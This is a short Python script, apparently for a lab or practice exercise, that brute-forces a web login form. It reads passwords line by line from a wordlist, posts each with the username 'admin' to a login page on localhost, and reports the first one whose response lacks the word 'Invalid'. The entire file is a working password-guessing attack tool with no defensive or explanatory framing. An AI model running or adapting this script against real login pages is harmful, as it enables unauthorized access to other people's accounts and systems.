import requests

url = "http://localhost/login"
username = "admin"
wordlist = "passwords.txt"

with open(wordlist, 'r') as file:
    for password in file:
        password = password.strip()
        data = {
            'username': username,
            'password': password
        }
        response = requests.post(url, data= data)

        if "Invalid" not in response.text:
            print(f"[+] Login successful with password: {password}")
            break
    else:
        print("[-] No valid password found in the wordlist.")